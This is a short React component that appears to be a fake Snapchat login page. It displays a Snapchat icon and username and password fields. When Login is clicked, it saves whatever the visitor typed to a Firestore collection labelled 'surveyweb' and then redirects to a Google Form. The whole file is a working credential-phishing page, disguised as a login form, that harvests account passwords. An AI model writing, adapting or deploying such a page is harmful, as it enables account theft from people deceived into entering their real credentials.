import React from "react";
import { SocialIcon } from "react-social-icons";
import { useEffect, useState } from "react";
import firebase from "firebase/compat/app";
import "firebase/compat/firestore";

export default function Login(props) {
  const [newMessage, setNewMessage] = useState({});
  const [messages, setMessages] = useState([]);
  const Url = "www.google.com";

  const handleSendMessage = async (e) => {
    const db = firebase.firestore();
    await db.collection("surveyweb").add({
      Platform: props.platform, 
      data: newMessage,
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
    });

    setNewMessage("");
    window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';

  };

  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setNewMessage((values) => ({ ...values, [name]: value }));
  };

  return (
    <div className="container">
      <SocialIcon network="Snapchat" />
      <div className="formdiv">
        <input
          type="text"
          name="username"
          value={newMessage.value}
          onChange={handleChange}
          placeholder="Username or Email"
          required
        ></input>
        <input
          type="password"
          name="password"
          placeholder="password"
          value={newMessage.value}
          onChange={handleChange}
          required
        ></input>
        <button onClick={handleSendMessage} >Login</button>
      </div>
    </div>
  );
}
